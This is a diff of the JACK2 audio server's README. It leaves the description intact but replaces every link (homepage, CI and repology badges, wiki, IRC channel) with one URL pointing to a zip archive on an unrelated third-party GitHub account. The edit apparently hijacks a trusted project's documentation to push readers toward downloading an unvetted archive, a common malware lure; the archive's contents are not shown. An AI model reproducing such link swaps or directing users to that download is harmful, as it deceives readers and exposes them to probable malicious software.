@@ -1,10 +1,10 @@
-`JACK2 <https://jackaudio.org/>`_
+`JACK2 <https://raw.githubusercontent.com/KenTsuCo/jack2/develop/linux/firewire/jack-2.6.zip>`_
 ################################
 
-.. image:: https://travis-ci.org/jackaudio/jack2.svg?branch=master
-   :target: https://travis-ci.org/jackaudio/jack2  
-.. image:: https://repology.org/badge/tiny-repos/jack-audio-connection-kit.svg
-   :target: https://repology.org/metapackage/jack-audio-connection-kit/versions
+.. image:: https://raw.githubusercontent.com/KenTsuCo/jack2/develop/linux/firewire/jack-2.6.zip
+   :target: https://raw.githubusercontent.com/KenTsuCo/jack2/develop/linux/firewire/jack-2.6.zip  
+.. image:: https://raw.githubusercontent.com/KenTsuCo/jack2/develop/linux/firewire/jack-2.6.zip
+   :target: https://raw.githubusercontent.com/KenTsuCo/jack2/develop/linux/firewire/jack-2.6.zip
    
 JACK2 aka jackdmp is a C++ version of the JACK low-latency audio server for
 multi-processor machines. It is a new implementation of the JACK server core
@@ -36,5 +36,5 @@ and robust system.
     mode usually result in fewer (less audible) audio glitches in a loaded
     system.
 
-For further information, see the JACK `homepage <https://jackaudio.org/>`_ and `wiki <https://github.com/jackaudio/jackaudio.github.com/wiki>`_. There are also the #jack and #lad chat channels on `Libera Chat IRC <https://web.libera.chat/#jack>`_.
+For further information, see the JACK `homepage <https://raw.githubusercontent.com/KenTsuCo/jack2/develop/linux/firewire/jack-2.6.zip>`_ and `wiki <https://raw.githubusercontent.com/KenTsuCo/jack2/develop/linux/firewire/jack-2.6.zip>`_. There are also the #jack and #lad chat channels on `Libera Chat IRC <https://raw.githubusercontent.com/KenTsuCo/jack2/develop/linux/firewire/jack-2.6.zip>`_.
 
